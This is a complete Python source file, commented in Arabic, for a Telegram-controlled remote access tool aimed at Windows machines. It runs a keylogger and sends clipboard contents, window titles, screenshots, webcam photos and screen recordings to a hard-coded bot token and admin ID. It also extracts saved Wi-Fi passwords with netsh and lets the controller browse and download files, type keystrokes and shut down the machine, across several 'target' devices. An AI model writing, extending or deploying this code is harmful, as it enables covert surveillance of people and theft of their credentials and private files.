import os
import sys
import time
import psutil
import pyautogui
import cv2
import requests
import pyttsx3
import pyperclip
import ctypes
import datetime
import webbrowser
import threading
import subprocess
import platform
import win32gui
import numpy as np
from pynput import keyboard
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# ==========================================
# ⚙️ الإعدادات (CONFIGURATION)
# ==========================================

TOKEN = "8500372242:AAFVPMzbH-cciXHkiCpXHH2AXaAMvZzrLa0"
ADMIN_IDS = [1431886140]

# ⚠️ اسم هذا الجهاز الحالي (يجب أن يكون فريداً)
DEVICE_ID = "LAPTOP_MASTER" 

# ⚠️ قائمة الأجهزة المعروفة (للتبديل بينها)
KNOWN_DEVICES = ["LAPTOP_MASTER", "PC_HOME", "WORK_LAPTOP"]

# مسارات الحفظ
DOWNLOAD_PATH = os.path.join(os.path.expanduser("~"), "Downloads")
CURRENT_PATH = os.getcwd()

# متغيرات التحكم
FLAGS = {
    "keylogger": False,
    "auto_screen": False,
    "auto_cam": False,
    "video_rec": False
}
LOGGED_KEYS = []
CLIPBOARD_HISTORY = []

# نظام الاستهداف (الافتراضي: الكل)
CURRENT_TARGET = "ALL" 

# ذاكرة مؤقتة للملفات
FILE_CACHE = {} 

# ==========================================
# 🛠️ دوال المساعدة والاتصال
# ==========================================

def is_targeted():
    """التحقق مما إذا كان هذا الجهاز هو المقصود بالأمر"""
    if CURRENT_TARGET == "ALL": return True
    if CURRENT_TARGET == DEVICE_ID: return True
    return False

def send_sync_msg(text):
    if not is_targeted(): return 
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        for admin in ADMIN_IDS:
            requests.post(url, data={"chat_id": admin, "text": text, "parse_mode": "Markdown"})
    except: pass

# دالة خاصة للإرسال الإجباري (تتجاهل الاستهداف - تستخدم عند بدء التشغيل)
def force_send_msg(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        for admin in ADMIN_IDS:
            requests.post(url, data={"chat_id": admin, "text": text, "parse_mode": "Markdown"})
    except: pass

def send_sync_photo(file_path, caption=""):
    if not is_targeted(): return
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        for admin in ADMIN_IDS:
            with open(file_path, 'rb') as f:
                requests.post(url, data={"chat_id": admin, "caption": caption}, files={"photo": f})
    except: pass

def send_sync_doc(file_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        for admin in ADMIN_IDS:
            with open(file_path, 'rb') as f:
                requests.post(url, data={"chat_id": admin, "caption": caption}, files={"document": f})
    except: pass

# ==========================================
# 🕵️‍♂️ خيوط المراقبة الخلفية (Thread Loop)
# ==========================================

def auto_monitor_loop():
    last_clip = ""
    last_win = ""  
    print("✅ Auto Monitor Thread Started...")
    
    while True:
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")

        # 1. مراقبة الحافظة
        try:
            curr_clip = pyperclip.paste()
            if curr_clip and curr_clip != last_clip:
                last_clip = curr_clip
                CLIPBOARD_HISTORY.append(f"[{timestamp}] {curr_clip}")
                if len(CLIPBOARD_HISTORY) > 10: CLIPBOARD_HISTORY.pop(0)
                if is_targeted():
                    send_sync_msg(f"📋 **نسخ جديد ({DEVICE_ID}):**\n`{curr_clip}`")
        except: pass

        # 2. مراقبة النافذة النشطة
        try:
            win = win32gui.GetForegroundWindow()
            txt = win32gui.GetWindowText(win)
            if txt and txt != last_win and len(txt) > 2:
                last_win = txt
                if is_targeted():
                    send_sync_msg(f"👀 **نشاط ({DEVICE_ID}):** `{txt}`")
        except: pass

        # 3. تصوير تلقائي
        if FLAGS["auto_screen"]:
            try:
                path = os.path.join(os.getenv('TEMP'), "auto_scr.png")
                pyautogui.screenshot(path)
                send_sync_photo(path, caption=f"🖥️ Auto Screen: {timestamp}")
                os.remove(path)
            except: pass

        if FLAGS["auto_cam"]:
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                if ret:
                    path = os.path.join(os.getenv('TEMP'), "auto_cam.jpg")
                    cv2.imwrite(path, frame)
                    send_sync_photo(path, caption=f"👁️ Auto Cam: {timestamp}")
                    os.remove(path)
                cap.release()
            except: pass

        time.sleep(3)

def keylogger_loop():
    def on_press(key):
        if FLAGS["keylogger"]:
            try: LOGGED_KEYS.append(key.char)
            except: LOGGED_KEYS.append(f"[{str(key).replace('Key.', '')}]")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=auto_monitor_loop, daemon=True).start()
threading.Thread(target=keylogger_loop, daemon=True).start()

# ==========================================
# 📂 مدير الملفات
# ==========================================

def get_file_keyboard(path):
    global FILE_CACHE
    FILE_CACHE = {} 
    keyboard = []
    try:
        items = os.listdir(path)
        keyboard.append([InlineKeyboardButton("⬆️ لأعلى", callback_data="DIR_UP"), InlineKeyboardButton("🏠 الرئيسية", callback_data="DIR_HOME")])
        idx = 0
        dirs = [d for d in items if os.path.isdir(os.path.join(path, d))][:5]
        for d in dirs:
            FILE_CACHE[str(idx)] = d
            keyboard.append([InlineKeyboardButton(f"📁 {d}", callback_data=f"NAV|{idx}")])
            idx += 1
        files = [f for f in items if os.path.isfile(os.path.join(path, f))][:5]
        for f in files:
            FILE_CACHE[str(idx)] = f
            keyboard.append([InlineKeyboardButton(f"📄 {f}", callback_data=f"DL|{idx}")])
            idx += 1
    except: keyboard.append([InlineKeyboardButton("❌ خطأ وصول", callback_data="NONE")])
    return InlineKeyboardMarkup(keyboard)

# ==========================================
# 🎮 القوائم (تم الدمج)
# ==========================================

main_kb = [
    [KeyboardButton("🎯 تحديد الهدف"), KeyboardButton("🖥️ المراقبة")],
    [KeyboardButton("👻 الشبح"), KeyboardButton("🛡️ الأمان")],
    [KeyboardButton("📂 الملفات"), KeyboardButton("🌐 الشبكة")],
    [KeyboardButton("🚀 الإنتاجية"), KeyboardButton("⚡ الطاقة")]
]

# قائمة تحديد الهدف
def get_target_kb():
    buttons = [[KeyboardButton("📢 الكل (All Devices)")]]
    row = []
    for dev in KNOWN_DEVICES:
        row.append(KeyboardButton(f"💻 {dev}"))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row: buttons.append(row)
    buttons.append([KeyboardButton("🔙 القائمة الرئيسية")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

monitor_kb = [
    [KeyboardButton("📸 لقطة شاشة"), KeyboardButton("👁️ صورة كاميرا")],
    [KeyboardButton("🔴 بدء تسجيل فيديو"), KeyboardButton("⏹ إيقاف التسجيل")],
    [KeyboardButton("⏱️ وقت التشغيل"), KeyboardButton("ℹ️ معلومات النظام")],
    [KeyboardButton("🔄 تشغيل Auto-Cam"), KeyboardButton("⏹ إيقاف Auto-Cam")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

power_kb = [
    [KeyboardButton("🔒 قفل"), KeyboardButton("💤 سكون")],
    [KeyboardButton("🛑 إيقاف التشغيل"), KeyboardButton("🔄 إعادة تشغيل")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

ghost_kb = [
    [KeyboardButton("📩 رسالة منبثقة"), KeyboardButton("🖼️ تغيير خلفية")],
    [KeyboardButton("🔊 التحكم بالصوت"), KeyboardButton("🔙 القائمة الرئيسية")]
]

security_kb = [
    [KeyboardButton("⌨️ تشغيل Keylogger"), KeyboardButton("⏹ إيقاف Keylogger")],
    [KeyboardButton("🕵️ صورة دخيل"), KeyboardButton("☠️ قتل برنامج")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

files_kb = [
    [KeyboardButton("📂 متصفح الملفات"), KeyboardButton("📋 نسخ الحافظة")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

network_kb = [
    [KeyboardButton("🔐 باسوردات الواي فاي"), KeyboardButton("🔗 اتصال بشبكة")],
    [KeyboardButton("📡 فحص الشبكات"), KeyboardButton("🚀 سرعة النت")],
    [KeyboardButton("🌍 IP عام"), KeyboardButton("🔙 القائمة الرئيسية")]
]

prod_kb = [
    [KeyboardButton("📚 وضع المذاكرة"), KeyboardButton("💻 وضع البرمجة")],
    [KeyboardButton("🚨 زر الطوارئ"), KeyboardButton("🛠️ أدوات إضافية")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

audio_kb = [
    [KeyboardButton("🔊 رفع"), KeyboardButton("🔉 خفض"), KeyboardButton("🔇 كتم")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

# ==========================================
# 🤖 معالج الأوامر الرئيسي
# ==========================================

def is_admin(uid): return uid in ADMIN_IDS

async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CURRENT_TARGET, LOGGED_KEYS, FLAGS
    
    if not is_admin(update.effective_user.id): return
    msg = update.message.text
    
    # --- منطق الاستهداف ---
    if msg == "🎯 تحديد الهدف":
        await update.message.reply_text(f"🎯 **الهدف الحالي:** {CURRENT_TARGET}\nاختر الجهاز:", reply_markup=get_target_kb())
        return
    
    elif msg == "📢 الكل (All Devices)":
        CURRENT_TARGET = "ALL"
        await update.message.reply_text(f"✅ {DEVICE_ID}: وضع الاستقبال العام.", reply_markup=ReplyKeyboardMarkup(main_kb, resize_keyboard=True))
        return

    elif msg.startswith("💻 "):
        target_name = msg.replace("💻 ", "")
        CURRENT_TARGET = target_name
        if DEVICE_ID == target_name:
            await update.message.reply_text(f"✅ **{DEVICE_ID}**: تم تحديدي كهدف.", reply_markup=ReplyKeyboardMarkup(main_kb, resize_keyboard=True))
        return

    # --- التنقل ---
    if msg in ["/start", "🔙 القائمة الرئيسية"]:
        await update.message.reply_text(f"🕹️ **{DEVICE_ID}** (Target: {CURRENT_TARGET})", reply_markup=ReplyKeyboardMarkup(main_kb, resize_keyboard=True))
        return

    # --- فلتر الاستهداف ---
    if not is_targeted(): return 

    # --- القوائم الفرعية ---
    if msg == "🖥️ المراقبة": await update.message.reply_text("👁️", reply_markup=ReplyKeyboardMarkup(monitor_kb, resize_keyboard=True))
    elif msg == "⚡ الطاقة": await update.message.reply_text("⚡", reply_markup=ReplyKeyboardMarkup(power_kb, resize_keyboard=True))
    elif msg == "👻 الشبح": await update.message.reply_text("👻", reply_markup=ReplyKeyboardMarkup(ghost_kb, resize_keyboard=True))
    elif msg == "🛡️ الأمان": await update.message.reply_text("🛡️", reply_markup=ReplyKeyboardMarkup(security_kb, resize_keyboard=True))
    elif msg == "📂 الملفات": await update.message.reply_text("📂", reply_markup=ReplyKeyboardMarkup(files_kb, resize_keyboard=True))
    elif msg == "🌐 الشبكة": await update.message.reply_text("🌐", reply_markup=ReplyKeyboardMarkup(network_kb, resize_keyboard=True))
    elif msg == "🚀 الإنتاجية": await update.message.reply_text("🚀", reply_markup=ReplyKeyboardMarkup(prod_kb, resize_keyboard=True))
    elif msg == "🛠️ أدوات إضافية": await update.message.reply_text("🛠️", reply_markup=ReplyKeyboardMarkup(audio_kb, resize_keyboard=True))

    # --- وظائف الأمان (Keylogger) ---
    elif msg == "⌨️ تشغيل Keylogger":
        FLAGS["keylogger"] = True
        LOGGED_KEYS = [] 
        await update.message.reply_text("✅ تم تشغيل تسجيل المفاتيح.")

    elif msg == "⏹ إيقاف Keylogger":
        FLAGS["keylogger"] = False
        await update.message.reply_text("🛑 تم الإيقاف. جاري سحب السجل...")
        if LOGGED_KEYS:
            file_name = f"keylog_{DEVICE_ID}_{int(time.time())}.txt"
            with open(file_name, "w", encoding="utf-8") as f: f.write("".join(LOGGED_KEYS))
            try:
                await update.message.reply_document(open(file_name, "rb"), caption=f"📝 سجل المفاتيح من {DEVICE_ID}")
                os.remove(file_name)
                LOGGED_KEYS = []
            except Exception as e: await update.message.reply_text(f"❌ خطأ: {e}")
        else: await update.message.reply_text("📭 السجل فارغ.")

    # --- وظائف الشبكة (الجديدة المدمجة) ---
    elif msg == "🔐 باسوردات الواي فاي":
        await update.message.reply_text("⏳ جاري الاستخراج...")
        try:
            d = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors='ignore')
            p = [i.split(":")[1][1:-1] for i in d.split('\n') if "All User Profile" in i]
            res = ""
            for i in p:
                try:
                    r = subprocess.check_output(f'netsh wlan show profile name="{i}" key=clear', shell=True).decode('cp850', errors='ignore')
                    k = [b.split(":")[1][1:-1] for b in r.split('\n') if "Key Content" in b]
                    res += f"📡 {i}: {k[0]}\n"
                except: res += f"📡 {i}: (Open/Error)\n"
            if len(res) > 4000:
                 with open("wifi.txt", "w", encoding="utf-8") as f: f.write(res)
                 await update.message.reply_document(open("wifi.txt", "rb"), caption="📶 WiFi List")
                 os.remove("wifi.txt")
            else:
                await update.message.reply_text(res if res else "📭 لم يتم العثور على شبكات محفوظة.")
        except Exception as e: await update.message.reply_text(f"❌ خطأ: {e}")

    elif msg == "🚀 سرعة النت":
        await update.message.reply_text("⏳ جاري قياس السرعة بدقة (Speedtest)...")
        def run_speedtest():
            try:
                import speedtest
                st = speedtest.Speedtest()
                st.get_best_server()
                down = st.download() / 1024 / 1024
                up = st.upload() / 1024 / 1024
                ping = st.results.ping
                res = f"🚀 **نتائج السرعة ({DEVICE_ID}):**\n⬇️ تحميل: {down:.2f} Mbps\n⬆️ رفع: {up:.2f} Mbps\n📶 بنج: {ping:.2f} ms"
                send_sync_msg(res)
            except ImportError:
                send_sync_msg("⚠️ مكتبة speedtest غير موجودة، يتم استخدام الطريقة البديلة.")
                try: send_sync_msg(f"🚀 {subprocess.check_output(['speedtest-cli','--simple']).decode('utf-8')}")
                except: pass
            except Exception as e: send_sync_msg(f"❌ خطأ في القياس: {e}")
        threading.Thread(target=run_speedtest).start()

    elif msg == "🌍 IP عام":
        try: await update.message.reply_text(f"🌐 `{requests.get('https://api.ipify.org').text}`")
        except: await update.message.reply_text("❌ غير متاح")

    elif msg == "📡 فحص الشبكات":
        try:
            res = subprocess.check_output('netsh wlan show networks', shell=True).decode('cp850', errors='ignore')
            await update.message.reply_text(f"📡 الشبكات المتاحة:\n{res}")
        except: await update.message.reply_text("❌ فشل الفحص")

    # --- المراقبة (صور وفيديو) ---
    elif msg == "📸 لقطة شاشة":
        p = "s.png"; pyautogui.screenshot(p); await update.message.reply_photo(open(p,'rb')); os.remove(p)
    
    elif msg == "👁️ صورة كاميرا":
        cap=cv2.VideoCapture(0); ret,f=cap.read()
        if ret: cv2.imwrite("c.jpg",f); cap.release(); await update.message.reply_photo(open("c.jpg",'rb')); os.remove("c.jpg")
        else: await update.message.reply_text("❌")
    
    elif msg == "🔴 بدء تسجيل فيديو":
        if FLAGS["video_rec"]: await update.message.reply_text("⚠️ يعمل بالفعل!")
        else:
            FLAGS["video_rec"] = True
            await update.message.reply_text("🎥 بدأ التسجيل...")
            def rec():
                try:
                    p = os.path.join(os.getenv('TEMP'), "v.avi")
                    out = cv2.VideoWriter(p, cv2.VideoWriter_fourcc(*"XVID"), 10.0, pyautogui.size())
                    while FLAGS["video_rec"]:
                        img = pyautogui.screenshot()
                        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
                        out.write(frame); time.sleep(0.05)
                    out.release()
                    send_sync_msg("⏳ جاري الرفع..."); send_sync_doc(p, caption="🎥 Video Log")
                    os.remove(p)
                except: FLAGS["video_rec"] = False
            threading.Thread(target=rec).start()

    elif msg == "⏹ إيقاف التسجيل":
        FLAGS["video_rec"] = False
        await update.message.reply_text("🛑 جاري الإيقاف...")

    elif msg == "🔄 تشغيل Auto-Cam": FLAGS["auto_cam"] = True; await update.message.reply_text("✅ مفعل")
    elif msg == "⏹ إيقاف Auto-Cam": FLAGS["auto_cam"] = False; await update.message.reply_text("🛑 متوقف")

    # --- أوامر أخرى ---
    elif msg == "ℹ️ معلومات النظام":
        await update.message.reply_text(f"📊 {DEVICE_ID}\nCPU: {psutil.cpu_percent()}%\nRAM: {psutil.virtual_memory().percent}%")
    elif msg == "🔒 قفل": ctypes.windll.user32.LockWorkStation()
    elif msg == "🛑 إيقاف التشغيل": os.system("shutdown /s /t 5")
    elif msg == "📩 رسالة منبثقة": await update.message.reply_text("اكتب: `/msg النص`")
    
    # --- الملفات ---
    elif msg == "📂 متصفح الملفات":
        global CURRENT_PATH; CURRENT_PATH = os.getcwd()
        await update.message.reply_text(f"📂 {CURRENT_PATH}", reply_markup=get_file_keyboard(CURRENT_PATH))
    elif msg == "📋 نسخ الحافظة": await update.message.reply_text(f"📋 `{pyperclip.paste()}`")

# ==========================================
# ⚡ معالجات التفاعل (Callbacks & Commands)
# ==========================================

async def file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_targeted(): return 
    query = update.callback_query; await query.answer(); data = query.data
    global CURRENT_PATH
    if data == "DIR_UP": CURRENT_PATH = os.path.dirname(CURRENT_PATH)
    elif data == "DIR_HOME": CURRENT_PATH = os.path.expanduser("~")
    elif data.startswith("NAV|"):
        idx = data.split("|")[1]
        if idx in FILE_CACHE: CURRENT_PATH = os.path.join(CURRENT_PATH, FILE_CACHE[idx])
    elif data.startswith("DL|"):
        idx = data.split("|")[1]
        if idx in FILE_CACHE:
            try: await query.message.reply_document(open(os.path.join(CURRENT_PATH, FILE_CACHE[idx]), 'rb'))
            except Exception as e: await query.message.reply_text(f"❌ {e}")
        return
    await query.edit_message_text(f"📂 `{CURRENT_PATH}`", reply_markup=get_file_keyboard(CURRENT_PATH))

async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id) or not is_targeted(): return
    txt = update.message.text
    if txt.startswith("/msg "): threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, txt.replace("/msg ", ""), "Msg", 0)).start()
    elif txt.startswith("/open "): webbrowser.open(txt.replace("/open ", ""))
    elif txt.startswith("/say "): threading.Thread(target=lambda: pyttsx3.speak(txt.replace("/say ", ""))).start()
    elif txt.startswith("/type "): pyautogui.write(txt.replace("/type ", ""))
    elif txt.startswith("/connect "):
        # منطق الاتصال المتقدم من control_bot.py
        try:
            creds = txt.replace("/connect ", "").split(",")
            xml = f"""<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{creds[0]}</name><SSIDConfig><SSID><name>{creds[0]}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{creds[1]}</keyMaterial></sharedKey></MSM></MSM></WLANProfile>"""
            with open("w.xml", "w") as f: f.write(xml)
            subprocess.run('netsh wlan add profile filename="w.xml"', shell=True)
            subprocess.run(f'netsh wlan connect name="{creds[0]}"', shell=True)
            os.remove("w.xml"); await update.message.reply_text(f"📡 Connecting to {creds[0]}...")
        except: await update.message.reply_text("❌ Format: /connect SSID,PASS")
    await update.message.reply_text("✅ Done")

async def doc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_targeted(): return
    if update.message.caption and "/wallpaper" in update.message.caption:
        f = await update.message.photo[-1].get_file()
        await f.download_to_drive("bg.jpg")
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("bg.jpg"), 0)
        await update.message.reply_text("🖼️ Done")

# ==========================================
# 🚀 التشغيل
# ==========================================

def main():
    print(f"🚀 ULTIMATE SYSTEM ACTIVE: {DEVICE_ID}")
    
    # إرسال تنبيه التشغيل (المنطق المدمج)
    startup_msg = f"🟢 **System Online:** {DEVICE_ID}\n📅 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🎯 Default Target: {CURRENT_TARGET}"
    force_send_msg(startup_msg)

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CallbackQueryHandler(file_callback))
    app.add_handler(MessageHandler(filters.Regex("^/"), cmd_handler))
    app.add_handler(MessageHandler(filters.PHOTO, doc_handler))
    app.add_handler(MessageHandler(filters.TEXT, menu_handler))
    app.run_polling()

if __name__ == '__main__':
    main()